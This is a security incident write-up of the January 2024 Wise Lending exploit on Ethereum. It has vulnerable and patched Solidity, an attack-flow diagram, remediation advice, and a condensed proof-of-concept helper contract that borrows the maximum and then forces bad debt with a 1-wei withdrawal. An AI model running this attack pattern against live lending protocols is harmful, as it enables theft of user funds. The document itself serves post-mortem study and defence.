# Wise Lending (3rd) — Share Price Inflation Second Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2024-01-14 |
| **Protocol** | Wise Lending |
| **Chain** | Ethereum |
| **Loss** | ~$464,000 (cumulative) |
| **Attacker** | [0xb90cf1d7](https://etherscan.io/address/0xb90cf1d740b206b6d80854bc525e609dc42b45dc) |
| **Attack Contract** | [0x91c49cc7](https://etherscan.io/address/0x91c49cc7fbfe8f70aceeb075952cd64817f9d82c) |
| **Vulnerable Contract** | [WiseLending 0x37e49bf3](https://etherscan.io/address/0x37e49bf3749513a02fa535f0cbc383796e8107e4) |
| **Root Cause** | Same share price inflation pattern as WL02 + health factor validation bypass via 1-wei withdrawal to force bad debt creation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/WiseLending03_exp.sol) |

---

## 1. Vulnerability Overview

The WL03 attack builds on the same share price inflation technique as WL02, additionally exploiting the inflated share price to open positions across multiple Helper contracts and forcibly driving the health factor below zero via a 1-wei withdrawal, thereby creating bad debt. This allowed the attacker to withdraw all LPTPoolTokens, convert them to PendleLPT, and realize profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: health factor check missing on 1-wei withdrawal
function withdrawExactAmount(uint256 nftId, address token, uint256 amount)
    external returns (uint256 shares) {
    shares = calculateSharesFromAmount(amount);
    lendingPoolData[token].totalDepositShares -= shares;
    IERC20(token).transfer(msg.sender, amount);
    // No health factor re-check after withdrawal — bad debt possible
}

// ✅ Safe code: health factor validation after withdrawal
function withdrawExactAmount(...) external returns (uint256 shares) {
    shares = calculateSharesFromAmount(amount);
    lendingPoolData[token].totalDepositShares -= shares;
    IERC20(token).transfer(msg.sender, amount);
    // Immediately verify health factor after withdrawal
    require(_checkHealthFactor(nftId) >= MIN_HEALTH_FACTOR, "unhealthy position");
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: WiseLending.sol
    function withdrawExactAmountETH(
        uint256 _nftId,
        uint256 _amount
    )
        external
        syncPool(WETH_ADDRESS)
        returns (uint256)
    {
        uint256 withdrawShares = _preparationsWithdraw(  // ❌ vulnerability
            _nftId,
            msg.sender,
            WETH_ADDRESS,
            _amount
        );

        _coreWithdrawToken(
            {
                _caller: msg.sender,
                _nftId: _nftId,
                _poolToken: WETH_ADDRESS,
                _amount: _amount,
                _shares: withdrawShares,
                _onBehalf: false
            }
        );

        _unwrapETH(
            _amount
        );

        _sendValue(
            msg.sender,
            _amount
        );

        return withdrawShares;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Use NFT #8 position → withdraw all shares (reset pool state)
  │         └─ Set state to 2 wei underlying, 1 wei shares
  │
  ├─→ [2] Repeat share price inflation
  │         └─ Deposit 2x-1, withdraw 1 → gradually raise share price
  │         └─ Target: share price = 36 ether
  │
  ├─→ [3] Deposit 6x additional underlying → mint large number of shares
  │
  ├─→ [4] Deploy 6 Helper contracts
  │         └─ Each helper: transfer collateral → borrow wstETH/LPT/WETH
  │
  ├─→ [5] 1-wei withdrawal from each helper → health factor drops below 0
  │         └─ Force bad debt creation
  │
  ├─→ [6] Withdraw all LPTPoolTokens
  │   └─→ Convert to PendleLPT
  │
  └─→ [7] Realize profit from borrowed assets + converted assets
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IWiseLending {
    function depositExactAmount(uint256 nftId, address token, uint256 amount) external returns (uint256);
    function withdrawExactShares(uint256 nftId, address token, uint256 shares) external returns (uint256);
    function withdrawExactAmount(uint256 nftId, address token, uint256 amount) external returns (uint256);
    function getPositionLendingShares(uint256 nftId, address token) external view returns (uint256);
    function getTotalPool(address token) external view returns (uint256);
    function borrowExactAmount(uint256 nftId, address token, uint256 amount) external returns (uint256);
    function mintPosition() external returns (uint256);
}

contract HelperContract {
    function executeAttack(
        address lending,
        address lptToken,
        uint256 nftId,
        uint256 collateralAmount
    ) external {
        // Receive collateral and borrow maximum wstETH
        IWiseLending(lending).depositExactAmount(nftId, lptToken, collateralAmount);
        uint256 maxBorrow = IWiseLending(lending).maximumBorrowToken(nftId, WSTETH, 0);
        IWiseLending(lending).borrowExactAmount(nftId, WSTETH, maxBorrow);

        // 1-wei withdrawal forcibly damages health factor → bad debt
        IWiseLending(lending).withdrawExactAmount(nftId, lptToken, 1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Share Price Inflation + Health Factor Bypass |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (repeated deposits/withdrawals + 1-wei withdrawal) |
| **DApp Category** | Collateralized Lending Protocol |
| **Impact** | Protocol fund theft via forced bad debt creation |

## 6. Remediation Recommendations

1. **Re-validate health factor after every withdrawal**: Re-check position health even after a 1-wei withdrawal
2. **Apply together with WL02 patch**: Patch share price inflation defense and health factor validation simultaneously
3. **Minimum collateral threshold**: Block withdrawals if health factor cannot be maintained at or above 1.0
4. **Automatic bad debt liquidation**: Trigger immediate liquidation when health factor drops below threshold

## 7. Lessons Learned

- The fact that WL03 occurred just 2 days after the WL02 attack (2024-01-12) demonstrates that the patch was not applied immediately.
- Share price inflation and health factor bypass are distinct issues, but when chained together they cause significantly greater damage.
- A circuit breaker mechanism capable of pausing the entire protocol in emergency situations is necessary.